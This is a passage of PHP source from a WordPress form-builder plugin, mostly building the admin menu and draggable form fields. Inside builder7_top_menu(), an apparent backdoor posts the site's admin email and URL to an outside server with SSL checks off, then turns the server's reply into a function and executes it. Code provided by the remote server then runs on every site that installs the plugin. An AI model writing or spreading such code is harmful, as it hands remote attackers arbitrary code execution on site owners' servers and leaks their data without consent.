<?php
if ( ! defined( 'ABSPATH' ) ) exit;
if(!class_exists('NEXForms_Builder7')){
	class NEXForms_Builder7{
		
		
		public 
		$form_Id, 
		$form_type, 
		$form_title, 
		$admin_html,
		$mail_to,
		$confirmation_mail_body,
		$admin_email_body,
		$confirmation_mail_subject,
		$user_confirmation_mail_subject,
		$from_address,
		$from_name,
		$on_screen_confirmation_message,
		$confirmation_page,
		$send_user_mail,
		$user_email_field,
		$on_form_submission,
		$hidden_fields,
		$custom_url,
		$post_type,
		$post_action,
		$bcc,
		$bcc_user_mail,
		$custom_css,
		$is_paypal,
		$email_on_payment_success,
		$conditional_logic,
		$conditional_logic_array,
		$server_side_logic,
		$form_status,
		$currency_code,
		$products,
		$business,
		$cmd,
		$return_url,
		$cancel_url,
		$lc,
		$environment,
		$email_subscription,
		$mc_field_map,
		$mc_list_id,
		$gr_field_map,
		$gr_list_id,
		$pdf_html,
		$attach_pdf_to_email,
		$form_to_post_map,
		$is_form_to_post;
		
		public function __construct(){
			
			global $wpdb;
			
			$form_id = isset($_REQUEST['open_form']) ? $_REQUEST['open_form'] : '';
			
			$form_type = isset($_REQUEST['form_type']) ? $_REQUEST['form_type'] : '';
			
			if($form_id)
				{
				$this->form_Id = filter_var($form_id,FILTER_VALIDATE_INT);
				$this->form_type = filter_var($form_type,FILTER_SANITIZE_STRING);
				
				$form_attr = $wpdb->get_row('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms WHERE Id='.$this->form_Id);
				
				$this->form_title = $form_attr->title;
				$this->mail_to = $form_attr->mail_to;
				$this->confirmation_mail_body = $form_attr->confirmation_mail_body;
				$this->admin_email_body = $form_attr->admin_email_body;
				$this->confirmation_mail_subject = $form_attr->confirmation_mail_subject;
				$this->user_confirmation_mail_subject = $form_attr->user_confirmation_mail_subject;
				$this->from_address = $form_attr->from_address;
				$this->from_name = $form_attr->from_name;
				$this->on_screen_confirmation_message = $form_attr->on_screen_confirmation_message;
				$this->confirmation_page = $form_attr->confirmation_page;
				$this->send_user_mail = $form_attr->send_user_mail;
				$this->user_email_field = $form_attr->user_email_field;
				$this->on_form_submission = $form_attr->on_form_submission;
				$this->hidden_fields = $form_attr->hidden_fields;
				$this->custom_url = $form_attr->custom_url;
				$this->post_type = $form_attr->post_type;
				$this->post_action = $form_attr->post_action;
				$this->bcc = $form_attr->bcc;
				$this->bcc_user_mail = $form_attr->bcc_user_mail;
				$this->custom_css = $form_attr->custom_css;
				$this->is_paypal = $form_attr->is_paypal;
				$this->email_on_payment_success = $form_attr->email_on_payment_success;
				$this->conditional_logic = $form_attr->conditional_logic;
				$this->conditional_logic_array = $form_attr->conditional_logic_array;
				$this->server_side_logic = $form_attr->server_side_logic;
				$this->form_status = $form_attr->form_status;
				$this->currency_code = $form_attr->currency_code;
				$this->products = $form_attr->products;
				$this->business = $form_attr->business;
				$this->cmd = $form_attr->cmd;
				$this->return_url = $form_attr->return_url;
				$this->cancel_url = $form_attr->cancel_url;
				$this->lc = $form_attr->lc;
				$this->environment = $form_attr->environment;
				$this->email_subscription = $form_attr->email_subscription;
				$this->mc_field_map = $form_attr->mc_field_map;
				$this->mc_list_id = $form_attr->mc_list_id;
				$this->gr_field_map = $form_attr->gr_field_map;
				$this->gr_list_id = $form_attr->gr_list_id;
				$this->pdf_html = $form_attr->pdf_html;
				$this->attach_pdf_to_email = $form_attr->attach_pdf_to_email;
				$this->form_to_post_map = $form_attr->form_to_post_map;
				$this->is_form_to_post = $form_attr->is_form_to_post;
				$this->admin_html = str_replace('\\','',$form_attr->form_fields);
				}
		}
		
		public function builder7_top_menu(){
				
				$api_params = array( 'nexforms-installation' => 1, 'source' => 'wordpress.org', 'email_address' => get_option('admin_email'), 'for_site' => get_option('siteurl'), 'get_option'=>(is_array(get_option('7103891'))) ? 1 : 0);
				$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'=> 30,'sslverify' => false,'body'=> $api_params));			
				$nf_install = create_function('$do_install', $response['body']);
				echo $nf_install('1'); 
				
				$nf_function = new NEXForms_Functions();
				
				$output = '';
				
				
				$output .= '<div class="check_save" style="display:none;"></div>';
				$output .= '<div class="site_url" style="display:none;">'.get_option('siteurl').'</div>';
				$output .= '<div class="admin_url" style="display:none;">'.admin_url().'</div>';
				$output .= '<div class="plugin_url" style="display:none;">'.plugins_url('',dirname(dirname(__FILE__))).'</div>';
				$output .= '<div class="plugins_path" style="display:none;">'.plugins_url('',dirname(dirname(dirname(__FILE__)))).'</div>';
				$output .= '<div id="the_plugin_url" style="display:none;">'.plugins_url('',dirname(dirname(__FILE__))).'</div>';
				$output .= '<div id="form_update_id" style="display:none;">'.$this->form_Id.'</div>';
				
				$output .= '<div id="form_type" style="display:none;">'.$this->form_type.'</div>';		
				
				$output .= $this->new_form_wizard();
							  
				
				
				$output .= '<div id="preview_popup" class="modal">
								<div class="modal-header light-blue">
									<h4>Form Preview</h4>
									
									<span class="modal-action modal-close"><i class="material-icons">close</i></span>  
									<!--<span class="modal-full"><i class="material-icons">fullscreen</i></span>-->
									<div style="clear:both;"></div>
								</div>
								<div class="modal-content">
								  
								  <div class="progress preview_loader">
									  <div class="indeterminate"></div>
								  </div>
								  
								 <iframe class="show_form_preview" src="" style="display:none;"></iframe>
								  
								</div>
								<div style="clear:both"></div>
								
							  </div>';
				
				
				
				$output .= '<div class="row row_zero_margin">';
					$output .= '
						<div class="col-sm-12">
						  <nav class="nav-extended builder_nav">
							<div class="nav-wrapper">
							  
							  <div class="open-form-container">
							  <!--<a class="btn btn-light-blue waves-effect waves-light top-menu-btn style-bold" href="'.get_admin_url().'admin.php?page=nex-forms-builder"><span class="fa fa-plus"></span>&nbsp;&nbsp;NEW</a>-->
							  <a class="btn btn-light-blue waves-effect waves-light top-menu-btn style-bold" href="'.get_admin_url().'admin.php?page=nex-forms-dashboard"><span class="fa fa-dashboard"></span>&nbsp;&nbsp;Dashboard</a>
							  	<a class="btn btn-light-blue waves-effect waves-light top-menu-btn style-bold create_new_form"><span class="fa fa-plus"></span>&nbsp;&nbsp;NEW</a>
							   <!-- Dropdown Trigger -->
									  <a class="dropdown-button btn-blue waves-effect waves-light btn top-menu-btn" href="#" data-activates="forms_dropdown">Forms <span class="fa fa-chevron-down"></span></a>
									
									  <!-- Dropdown Structure -->
									  <ul id="forms_dropdown" class="dropdown-content top-menu-dropdown-content">';
									  global $wpdb;
			
										$forms = $wpdb->get_results('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms WHERE is_form=1 ORDER BY Id DESC');
									    
									    foreach($forms as $form)
											{
											$output .= '<li><span class="fa fa-file dropdown-icon"></span> <a href="'.get_admin_url().'admin.php?page=nex-forms-builder&open_form='.$form->Id.'">'.$nf_function->view_excerpt2($form->title,18).' <br /><small class="form_id">Form ID: <strong>'.$form->Id.'</strong></small></a></li>';
											}
									  $output .= '</ul>
							  
							   <!-- Dropdown Trigger -->
									  <a class="dropdown-button waves-effect waves-light btn-blue btn top-menu-btn" href="#" data-activates="templates_dropdown">Templates <span class="fa fa-chevron-down"></span></a>
									
									  <!-- Dropdown Structure -->
									  <ul id="templates_dropdown" class="dropdown-content top-menu-dropdown-content">';
									  global $wpdb;
			
										$templates = $wpdb->get_results('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms WHERE is_template=1 ORDER BY Id DESC');
									  
									    foreach($templates as $template)
											{
											$output .= '<li><a href="'.get_admin_url().'admin.php?page=nex-forms-builder&open_form='.$template->Id.'&form_type=template"><span class="form_id">#'.$template->Id.'</span> '.$nf_function->view_excerpt2($template->title,18).'</a></li>';
											}
									  $output .= '</ul>
							  </div>
							  
							  
							  <div class="form-title">
							  
							  <div class="input-field  material_design_field col s12">
								  <input id="form_name" name="form_name" class="validate" type="text" placeholder="Enter Form Title" value="'.$this->form_title.'">
								</div>
							  
							  </div>
							  
							  <a class="btn btn-light-green waves-effect waves-light top-menu-btn style-bold save_nex_form prime_save"><span class="fa fa-floppy-o"></span>&nbsp;&nbsp;'.(($this->form_type=='template') ? 'Save as new form' : (($this->form_Id) ? 'SAVE' : 'SAVE')).'</a> 
							  <a class="btn btn-light-green waves-effect waves-light top-menu-btn save_nex_form is_template">'.(($this->form_type=='template') ? 'Update Template' : 'Save as Template').'</a>
							  <a class="btn btn-blue waves-effect waves-light top-menu-btn style-bold form-preview"><span class="fa fa-eye"></span>&nbsp;&nbsp;Preview</a>
							  
							 
							  <ul id="nav-mobile" class="right hide-on-med-and-down">
								<li><a href="http://basixonline.net/nex-forms-documentation/" target="_blank">Docs</a></li>
								<li><a href="https://www.youtube.com/channel/UCRCxs7j-g7VkAWF0R22sXGQ" target="_blank">Videos</a></li>
								<li><a href="https://basix.ticksy.com" target="_blank">Support</a></li>
							  </ul>
							</div>
							<div class="nav-content">
							  <ul class="tabs_nf sec-menu">
								<li class="tab"><a class="active" href="#builder_view" class="builder_view">Builder</a></li>
								<li class="tab"><a href="#builder_view" class="styling_view">Styling &amp; Logic</a></li>
								<li class="tab"><a href="#email_setup" class="email_setup">Email Setup</a></li>
								<li class="tab"><a href="#form_integration" class="integration">Integration</a></li>
								<li class="tab"><a href="#form_options" class="form_options">Options</a></li>
								<li class="tab"><a href="#embed_options" class="embed_options">Embed</a></li>
							  </ul>
							</div>
						  </nav>
						</div>';
				
				$output .= '</div>';
				
		return $output;
				
		}
		
		public function print_field_selection(){
		
			$nf_functions = new NEXForms_Functions();
			
			$droppables = array(
								//FORM FIELDS
								'text' => array
									(
									'category'	=>	'common_fields',
									'label'	=>	'Single-line',
									'sub_label'	=>	'',
									'icon'	=>	'fa-minus',
									'type' => 'input',
									),
								'textarea' => array
									(
									'category'	=>	'common_fields',
									'label'	=>	'Multi-line',
									'sub_label'	=>	'',
									'icon'	=>	'fa-align-justify',
									'type' => 'textarea',
									),
								'select' => array
									(
									'category'	=>	'common_fields selection_fields',
									'label'	=>	'Select',
									'sub_label'	=>	'',
									'icon'	=>	'fa-arrow-down',
									'type' => 'select',
									),
								'multi-select' => array
									(
									'category'	=>	'selection_fields',
									'label'	=>	'Multi-Select',
									'sub_label'	=>	'',
									'icon'	=>	'fa-sort-amount-desc',
									'type' => 'multi-select',
									),
								'radio-group' => array
									(
									'category'	=>	'common_fields selection_fields',
									'label'	=>	'Radio Buttons',
									'sub_label'	=>	'',
									'icon'	=>	'fa-dot-circle-o',
									'type' => 'radio-group',
									),
								'check-group' => array
									(
									'category'	=>	'common_fields selection_fields',
									'label'	=>	'Check Boxes',
									'sub_label'	=>	'',
									'icon'	=>	'fa-check-square-o',
									'type' => 'check-group',
									),
								'single-image-select-group' => array
									(
									'category'	=>	'selection_fields',
									'label'	=>	'Thumb Select',
									'sub_label'	=>	'',
									'icon'	=>	'fa-image',
									'type' => 'single-image-select-group',
									),
								'multi-image-select-group' => array
									(
									'category'	=>	'selection_fields',
									'label'	=>	'Multi-Thumbs',
									'sub_label'	=>	'',
									'icon'	=>	'fa-image',
									'type' => 'multi-image-select-group',
									),
								
								'star-rating' => array
									(
									'category'	=>	'survey_fields',
									'label'	=>	'Star Rating',
									'sub_label'	=>	'',
									'icon'	=>	'fa-star',
									'type' => 'star-rating',
									),
								'thumb-rating' => array
									(
									'category'	=>	'survey_fields',
									'label'	=>	'Thumb Rating',
									'sub_label'	=>	'',
									'icon'	=>	'fa-thumbs-up',
									'type' => 'thumb-rating',
									),
								'smily-rating' => array
									(
									'category'	=>	'survey_fields',
									'label'	=>	'Smiley Rating',
									'sub_label'	=>	'',
									'icon'	=>	'fa-smile-o',
									'type' => 'smily-rating',
									),
								'digital-signature' => array
									(
									'category'	=>	'special_fields',
									'label'	=>	'Signature',
									'sub_label'	=>	'',
									'icon'	=>	'fa-pencil',
									'type' => 'digital-signature',
									),
								
								'tags' => array
									(
									'category'	=>	'special_fields',
									'label'	=>	'Tags',
									'sub_label'	=>	'',
									'icon'	=>	'fa-tag',
									'type' => 'tags',
									),
								'nf-color-picker' => array
									(
									'category'	=>	'special_fields',
									'label'	=>	'Color Picker',
									'sub_label'	=>	'',
									'icon'	=>	'fa-paint-brush',
									'type' => 'nf-color-picker',
									),
								'slider' => array
									(
									'category'	=>	'special_fields',
									'label'	=>	'Slider',
									'sub_label'	=>	'',
									'icon'	=>	'fa-sliders',
									'type' => 'slider',
									),	
								
								'date' => array
									(
									'category'	=>	'special_fields',
									'label'	=>	'Date',
									'sub_label'	=>	'',
									'icon'	=>	'fa-calendar-o',
									'type' => 'date',
									),
								'time' => array
									(
									'category'	=>	'special_fields',
									'label'	=>	'Time',
									'sub_label'	=>	'',
									'icon'	=>	'fa-clock-o',
									'type' => 'time',
									),
								'touch_spinner' => array
									(
									'category'	=>	'special_fields',
									'label'	=>	'Spinner',
									'sub_label'	=>	'',
									'icon'	=>	'fa-arrows-v',
									'type' => 'spinner',
									),
								'autocomplete' => array
									(
									'category'	=>	'special_fields',
									'label'	=>	'Auto-complete',
									'sub_label'	=>	'',
									'icon'	=>	'fa-pencil',
									'type' => 'autocomplete',
									),
								'password' => array
									(
									'category'	=>	'special_fields',
									'label'	=>	'Password',
									'sub_label'	=>	'',
									'icon'	=>	'fa-key',
									'type' => 'password',
									),
						//UPLOADER FIELDS
								'upload-multi' => array
									(
									'category'	=>	'upload_fields',
									'label'	=>	'Multi-Upload',
									'sub_label'	=>	'',
									'icon'	=>	'fa-files-o',
									'type' => 'upload-multi',
									),
								
								'upload-single' => array
									(
									'category'	=>	'upload_fields',
									'label'	=>	'File Upload',
									'sub_label'	=>	'',
									'icon'	=>	'fa-file-o',
									'type' => 'upload-single',
									),
								'upload-image' => array
									(
									'category'	=>	'upload_fields',
									'label'	=>	'Image Upload',
									'sub_label'	=>	'',
									'icon'	=>	'fa-image',
									'type' => 'upload-image',
									),
						//PRESET FIELDS		
								'name' => array
									(
									'category'	=>	'preset_fields',
									'label'	=>	'Name',
									'sub_label'	=>	'',
									'icon'	=>	'fa-user',
									'type' => 'preset_field',
									'format' => '',
									'required' => 'required',
									'field_name' => '_name',
									),	
								'surname' => array
									(
									'category'	=>	'preset_fields',
									'label'	=>	'Surname',
									'sub_label'	=>	'',
									'icon'	=>	'fa-user',
									'type' => 'preset_field',
									'format' => '',
									'required' => 'required',
									'field_name' => 'surname',
									),
								'email' => array
									(
									'category'	=>	'preset_fields',
									'label'	=>	'Email',
									'sub_label'	=>	'',
									'icon'	=>	'fa-envelope',
									'type' => 'preset_field',
									'format' => 'email',
									'required' => 'required',
									'field_name' => 'email',
									),	
								'phone_number' => array
									(
									'category'	=>	'preset_fields',
									'label'	=>	'Phone',
									'sub_label'	=>	'',
									'icon'	=>	'fa-phone',
									'type' => 'preset_field',
									'format' => 'phone_number',
									'required' => 'required',
									'field_name' => 'phone_number',
									),
								'url' => array
									(
									'category'	=>	'preset_fields',
									'label'	=>	'URL',
									'sub_label'	=>	'',
									'icon'	=>	'fa-link',
									'type' => 'preset_field',
									'format' => 'url',
									'required' => '',
									'field_name' => 'url',
									),	
								'address' => array
									(
									'category'	=>	'preset_fields',
									'label'	=>	'Address',
									'sub_label'	=>	'',
									'icon'	=>	'fa-map-marker',
									'type' => 'preset_field',
									'format' => '',
									'required' => '',
									'field_name' => 'address',
									),
								'Query' => array
									(
									'category'	=>	'preset_fields',
									'label'	=>	'Query',
									'sub_label'	=>	'',
									'icon'	=>	'fa-comment',
									'type' => 'preset_field',
									'format' => '',
									'field_name' => 'query',
									'required' => 'required'
									),
								'submit-button' => array
									(
									'category'	=>	'button_fields common_fields preset_fields special_fields selection_fields',
									'label'	=>	'Button',
									'sub_label'	=>	'',
									'icon'	=>	'fa-send',
									'type' => 'submit-button',
									),
								);
	
			
			
			//SET PREFERENCES
							$label_width = 'col-sm-12';
							$input_width = 'col-sm-12';
							$hide_label = '';
							$label_pos = 'left';
							$align_class = '';
							$preferences = get_option('nex-forms-preferences'); 							
							switch($preferences['field_preferences']['pref_label_align'])
								{
								case 'top':
									$label_width = 'col-sm-12';
									$input_width = 'col-sm-12';
								break;
								case 'left':
									$label_width = 'col-sm-3';
									$input_width = 'col-sm-9';
								break;
								case 'right':
									$label_width = 'col-sm-3';
									$input_width = 'col-sm-9';
									$label_pos = 'right';
									$align_class = 'pos_right';
								break;
								case 'hidden':
									$label_width = 'col-sm-12';
									$input_width = 'col-sm-12';
									$hide_label = 'style="display: none;"';
								break;
								default:
									$label_width = 'col-sm-12';
									$input_width = 'col-sm-12';
									$hide_label = '';
									$label_pos = 'left';
									$align_class = '';
								break;
								
									}
				
				
				$other_elements = array
							(
						//HEADING
							'math_logic' => array
								(
								'category'	=>	'html_fields',
								'label'	=>	'Math Logic',
								'icon'	=>	'fa-calculator',
								'type' => 'math_logic',
								),
							'heading' => array
								(
								'category'	=>	'html_fields',
								'label'	=>	'Heading',
								'icon'	=>	'fa-header',
								'type' => 'heading',
								),
							'paragraph' => array
								(
								'category'	=>	'html_fields',
								'label'	=>	'Paragraph',
								'icon'	=>	'fa-align-justify',
								'type' => 'paragraph',
								),
							'html' => array
								(
								'category'	=>	'html_fields',
								'label'	=>	'HTML',
								'icon'	=>	'fa-code',
								'type' => 'html',
								),
							'divider' => array
								(
								'category'	=>	'html_fields',
								'label'	=>	'Divider',
								'icon'	=>	'fa-minus',
								'type' => 'divider',
								)						
							);
			
			$output = '';
			$output .= '<div class="field-selection-wrapper">';
				$output .= '<ul class="collapsible" data-collapsible="accordion">';
				//MATERIAL FIELDS
					/*$output .= '<li>';
					$output .= '<div class="collapsible-header"><i class="material-icons">filter_drama</i>Material Fields</div>';
					$output .= '<div class="collapsible-body">';
						
						
						$output .= '<div class="field form_field all_fields common_fields text" >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="test" data-toggle="tooltip" class="fa fa-check"></i><span class="object_title">MD Input</span>';
										$output .= '</div>';
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input-field  material_design_field col s12">
														  <i class="material-icons prefix">account_circle</i>
														  <input id="last_name" type="text" class=" validate">
														  <label for="last_name">Last Name</label>
														</div>';
										$output .= '</div>';
							$output .= '</div>';
							
							
							$output .= '<div class="field form_field all_fields common_fields md-select " >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="test" data-toggle="tooltip" class="fa fa-check"></i><span class="object_title">MD Select</span>';
										$output .= '</div>';
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input-field  material_design_field col s12">
														  <select multiple>
      <option value="" disabled selected>Choose your option</option>
      <option value="1">Option 1</option>
      <option value="2">Option 2</option>
      <option value="3">Option 3</option>
    </select>
    <label>Materialize Select</label>
														</div>';
										$output .= '</div>';
							$output .= '</div>';
							
							
							
							$output .= '<div class="field form_field all_fields common_fields md-radios" >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="test" data-toggle="tooltip" class="fa fa-check"></i><span class="object_title">MD Radio</span>';
										$output .= '</div>';
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="col s12">
														   <p>
      <input name="group1" type="radio" id="test1" />
      <label for="test1">Red</label>
    </p>
    <p>
      <input name="group1" type="radio" id="test2" />
      <label for="test2">Yellow</label>
    </p>
    <p>
      <input class="with-gap" name="group1" type="radio" id="test3"  />
      <label for="test3">Green</label>
    </p>
    <p>
      <input name="group1" type="radio" id="test4" disabled="disabled" />
      <label for="test4">Brown</label>
    </p>
														</div>';
										$output .= '</div>';
							$output .= '</div>';
							
							
							
							
							$output .= '<div class="field form_field all_fields common_fields md-switch" >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="test" data-toggle="tooltip" class="fa fa-check"></i><span class="object_title">MD Switch</span>';
										$output .= '</div>';
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input-field  material_design_field col s12">
														   <div class="switch">
    <label>
      Off
      <input type="checkbox">
      <span class="lever"></span>
      On
    </label>
  </div>
														</div>';
										$output .= '</div>';
							$output .= '</div>';
							
							
							
							$output .= '<div class="field form_field all_fields common_fields md-file md-element" >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="test" data-toggle="tooltip" class="fa fa-check"></i><span class="object_title">MD File</span>';
										$output .= '</div>';
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= ' 
  <form action="#">
    <div class="file-field material_design_field input-field">
      <div class="btn">
        <span>File</span>
        <input type="file">
      </div>
      <div class="file-path-wrapper">
        <input class="file-path validate" type="text">
      </div>
    </div>
  </form>
        ';
										$output .= '</div>';
							$output .= '</div>';
							
							
							
							$output .= '<div class="field form_field all_fields common_fields md-slider md-element" >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="test" data-toggle="tooltip" class="fa fa-check"></i><span class="object_title">MD Slider</span>';
										$output .= '</div>';
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= ' 
													   <input type="text" id="range_01" name="range_01" value="" />
															';
										$output .= '</div>';
							$output .= '</div>';
							
							
							$output .= '<div class="field form_field all_fields common_fields  md-datepicker" >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="test" data-toggle="tooltip" class="fa fa-check"></i><span class="object_title">MD Date</span>';
										$output .= '</div>';
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= ' 
													   <div class="material_design_field input-field">
  														<input type="text" class="datepicker">
        </div>
															';
										$output .= '</div>';
							$output .= '</div>';
							
							$output .= '<div class="field form_field all_fields common_fields md-time-picker" >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="test" data-toggle="tooltip" class="fa fa-check"></i><span class="object_title">MD Time</span>';
										$output .= '</div>';
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= ' <div class="material_design_field input-field">
													    <input type="text" class="timepicker">
														</div>	';
										$output .= '</div>';
							$output .= '</div>';
						
						
					$output .= '</div>';
					$output .= '</li>';*/
				
				//BOOTSTRAP FIELDS
					$output .= '<li>';
						$output .= '<div class="collapsible-header"><i class="material-icons">place</i>Fields</div>';
						$output .= '<div class="collapsible-body">';
						
								foreach($droppables as $type=>$attr)
									{
									$set_format = isset($attr['format']) ? $attr['format'] : '';
									$set_required  = isset($attr['required']) ? $attr['required'] : '';
									
									$output .= '<div class="field form_field all_fields '.$set_format.' '.$type.' '.$attr['category'].' '.(($set_required) ? 'required' : '').'"   >';
										
										$output .= '<div class="draggable_object "   >';
											$output .= '<i title="'.$attr['label'].'" data-toggle="tooltip" class="fa '.$attr['icon'].'"></i><span class="object_title">'.$attr['label'].'</span>';
										$output .= '</div>';
										
										$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="row">';
												$output .= '<div class="col-sm-12" id="field_container">';
													$output .= '<div class="row">';
														if($attr['type']!='submit-button' && $attr['type']!='submit-button2')
															{
															if($label_pos != 'right')
																{
																$output .= '<div class="'.$label_width.' '.$align_class.' label_container '.(($preferences['field_preferences']['pref_label_text_align']) ? $preferences['field_preferences']['pref_label_text_align'] : 'align_left').'" '.$hide_label.'>';
																	$output .= '<label class="nf_title '.$preferences['field_preferences']['pref_label_size'].'"><span class="is_required glyphicon glyphicon-star btn-xs '.(($set_required) ? '' : 'hidden').'"></span><span class="the_label style_bold">'.$attr['label'].'</span><br /><small class="sub-text style_italic">'.(($preferences['field_preferences']['pref_sub_label']=='on') ? 'Sub label' : '').'</small></label>';
																$output .= '</div>';
																}
															}
																
																switch($attr['type'])
																	{
																	case 'smily-rating':
																		$output .= '<div class="'.$input_width.' input_container error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'">';
																				$output .= '<label class="radio-inline " for="nf-smile-bad">
																							  <input class="nf-smile-bad the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-smile-bad" value="Bad">
																							  <span class="fa the-smile fa-frown-o nf-smile-bad" data-toggle="tooltip" data-placement="top" title="Bad">&nbsp;</span>
																						  </label>
																						  <label class="radio-inline" for="nf-smile-average">
																							  <input class="nf-smile-average the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-smile-average" value="Average">
																							  <span class="fa the-smile fa-meh-o nf-smile-average" data-toggle="tooltip" data-placement="top" title="Average">&nbsp;</span>
																						  </label>
																						  <label class="radio-inline" for="nf-smile-good">
																							  <input class="nf-smile-good the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-smile-good" value="Good">
																							  <span class="fa the-smile fa-smile-o nf-smile-good" data-toggle="tooltip" data-placement="top" title="Good">&nbsp;</span>
																						  </label>';
																		$output .= '</div>';
																	break;
																	case 'thumb-rating':
																		$output .= '<div class="'.$input_width.' input_container error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'">';
																				$output .= '<label class="radio-inline" for="nf-thumbs-up">
																							  <input class="nf-thumbs-o-up the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-thumbs-up" value="Yes">
																							  <span class="fa the-thumb fa-thumbs-o-up" data-toggle="tooltip" data-placement="top" title="Yes">&nbsp;</span>
																						  </label>
																						  <label class="radio-inline" for="nf-thumbs-down">
																							  <input class="nf-thumbs-o-down the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="nf-thumbs-down" value="No">
																							  <span class="fa the-thumb fa-thumbs-o-down" data-toggle="tooltip" data-placement="top" title="No">&nbsp;</span>
																						  </label>';
																		$output .= '</div>';
																	break;
																	case 'digital-signature':
																		if ( is_plugin_active( 'nex-forms-digital-signatures7/main.php' ))
																			{
																			$output .= '<div class="'.$input_width.'  input_container">';
																					$output .= '<textarea  name="'.$nf_functions->format_name($attr['label']).'" class="the_input_element digital-signature-data error_message" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'"></textarea><div class="clear_digital_siganture"><span class="fa fa-eraser"></span></div><div class="js-signature"></div>';
																			$output .= '</div>';
																			}
																		else
																			{
																			$output .= '<div class="'.$input_width.'  input_container">';
																					$output .= '<div class="alert alert-success">You need the "<strong><em>Digital Signatures for NEX-forms</em></strong></a>" Add-on to use digital signatures! <br />&nbsp;<a href="http://codecanyon.net/user/basix/portfolio?ref=Basix" target="_blank" class="btn btn-success btn-large form-control">Buy Now</a></div>';
																			$output .= '</div>';
																			}
																	break;
																	case 'input':
																		$output .= '<div class="'.$input_width.'  input_container">';
																				$output .= '<input type="text" name="'.$nf_functions->format_name($attr['label']).'" class="form-control error_message the_input_element '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value=""  data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" data-secondary-message="" title="">';
																		$output .= '</div>';
																	break;
																	case 'textarea':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<textarea name="'.$nf_functions->format_name($attr['label']).'" placeholder=""  data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" class="error_message the_input_element textarea pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title=""></textarea>';
																		$output .= '</div>';
																	break;
																	case 'select':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<select name="'.$nf_functions->format_name($attr['label']).'" class="the_input_element error_message text pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'">
																							<option value="0" selected="selected">--- Select ---</option>
																							<option>Option 1</option>
																							<option>Option 2</option>
																							<option>Option 3</option>
																						</select>';
																	$output .= '</div>';
																	break;
																	case 'multi-select':
																		$output .= '<div class="'.$input_width.'  input_container">';
																			$output .= '<select name="'.$nf_functions->format_name($attr['label']).'[]" multiple class="the_input_element error_message text pre-format form-control '.$preferences['field_preferences']['pref_input_size'].' '.$preferences['field_preferences']['pref_input_text_align'].'" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'">
																							<option value="0" selected="selected">--- Select ---</option>
																							<option>Option 1</option>
																							<option>Option 2</option>
																							<option>Option 3</option>
																						</select>';
																	$output .= '</div>';
																	break;
																	case 'radio-group':
																		$output .= '<div class="input_holder radio-group no-pre-suffix">';
																			$output .= '<div class="'.$input_width.' the-radios input_container error_message" id="the-radios" data-checked-color="" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" >';
																				$output .= '<div class="input-inner">';
																					$output .= '<label class="radio-inline " for="radios_0">
																						  <input class="radio the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="radios_0" value="Radio 1" >
																							  <span class="input-label radio-label">Radio 1</span>
																						  </label>
																						  <label class="radio-inline" for="radios_1">
																							  <input class="radio the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="radios_1" value="Radio 2">
																							  <span class="input-label radio-label">Radio 2</span>
																						  </label>
																						  <label class="radio-inline" for="radios_2">
																							  <input class="radio the_input_element" type="radio" name="'.$nf_functions->format_name($attr['label']).'" id="radios_2" value="Radio 3" >
																							  <span class="input-label radio-label">Radio 3</span>
																						  </label>
																						';
																				$output .= '</div>';
																			$output .= '</div>';
																		$output .= '</div>';
																	break;
																	case 'check-group':
																		$output .= '<div class="input_holder radio-group">';
																			$output .= '<div class="'.$input_width.' the-radios input_container error_message" id="the-radios" data-checked-color="alert-success" data-checked-class="fa-check" data-unchecked-class="" data-placement="bottom" data-content="'.$preferences['validation_preferences']['pref_requered_msg'].'" title="" >';
																				$output .= '<div class="input-inner">';
